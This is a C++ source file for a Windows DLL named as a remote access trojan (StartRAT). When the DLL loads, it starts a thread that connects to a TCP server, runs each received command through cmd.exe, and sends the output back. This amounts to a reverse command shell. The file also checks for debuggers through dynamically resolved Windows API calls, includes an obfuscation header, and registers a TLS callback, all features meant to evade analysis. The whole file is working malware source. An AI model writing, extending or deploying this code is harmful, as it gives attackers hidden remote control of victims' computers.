#include <iostream>
#include <string>
#include "TCPClient.h"
#include "utils.h"
#include "winapi_function_signatures.h"
#include "winapi_obfuscation.h"

DWORD WINAPI StartRAT(LPVOID lpParam)
{
	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
	conn->start_connection();

	while (true)
	{
		if (resolve_dynamically<IsDebuggerPresent_t>("IsDebuggerPresent")() || isDebuggerAttached())
			resolve_dynamically<ExitThread_t>("ExitThread")(0);

		// recv command from server
		std::string commandLine = "cmd.exe /C ";
		commandLine.append(conn->recv_data());
		std::string result = exec(commandLine);

		// send result back to server
		conn->send_data(result);
	}
	delete conn;

	return 0;
}


BOOL WINAPI DllMain(HINSTANCE dllHandle, DWORD reason_for_call, LPVOID lpvReserved)
{
	switch (reason_for_call) {
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(dllHandle);  // Avoid repeated DllMain calls for threads
		CreateThread(nullptr, 0, StartRAT, nullptr, 0, nullptr); // Create a separate thread to run after DllMain, to avoid deadlocks
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void NTAPI TLSCallback(PVOID dllHandle, DWORD reason, PVOID reserved)
{
	switch (reason) {
	case DLL_PROCESS_ATTACH:
		/* Check for debugging here - maybe create a thread that will run infinitely and check for it debuggers*/
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
}

#ifdef _WIN64 
#pragma const_seg(".CRT$XLB")
extern "C" PIMAGE_TLS_CALLBACK tls_callback = TLSCallback;
#pragma const_seg()
#else
#pragma data_seg(".CRT$XLB")
PIMAGE_TLS_CALLBACK tls_callback = TLSCallback;
#pragma data_seg()
#endif

